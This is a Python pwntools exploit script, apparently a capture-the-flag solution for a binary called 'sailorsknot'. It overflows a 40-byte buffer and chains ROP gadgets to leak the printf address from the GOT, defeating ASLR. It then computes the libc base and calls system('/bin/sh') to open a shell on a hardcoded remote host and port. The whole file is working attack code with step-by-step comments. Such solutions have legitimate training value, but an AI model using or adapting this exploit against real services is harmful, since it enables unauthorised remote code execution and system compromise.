#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

elf = ELF("sailorsknot")
rop = ROP(elf)

# First ROP payload to get libc address (bypassing ASLR)
rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
rop.call("printf", [elf.got["printf"]])
rop.raw(rop.find_gadget(["ret"]))  # Align stack before call to % 16
rop.call("main")
print(rop.dump())

# p = elf.process()  # Local testing
p = remote("46.101.107.117", 2112)

p.recvuntil("\n")  # Welcome! Please give me your name!
p.sendline(b'A' * 40 + rop.chain())
p.recvuntil("\n")  # Hi XYZ, nice to meet you!

printf_address = u64(p.recvuntil("\n")[:6].ljust(8, b"\x00"))  # printf address (6 bytes) + Welcome! Please give ..
print("remote printf address: " + hex(printf_address))  # Address changes with each run (ASLR)

# 'printf' address always ends with e80 (ASLR doesn't change last 3 values because of paging)
# we can do the same exercise for 'gets', the address always ends with 0b0
# using https://libc.blukat.me/ we can determine the exact libc version which is libc6_2.27-3ubuntu1_amd64

# libc = ELF("libc6_2.31-3_amd64.so")  # Local testing
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")

# Set libc base address (current printf address - libc printf offset, 0x064e80 in this version)
libc.address = printf_address - libc.symbols["printf"]
print("libc base address: " + hex(libc.address))

# Second payload to get a remote shell
rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
print(rop.dump())

p.sendline(b'A' * 40 + rop.chain())
p.recvuntil("\n")
p.interactive()
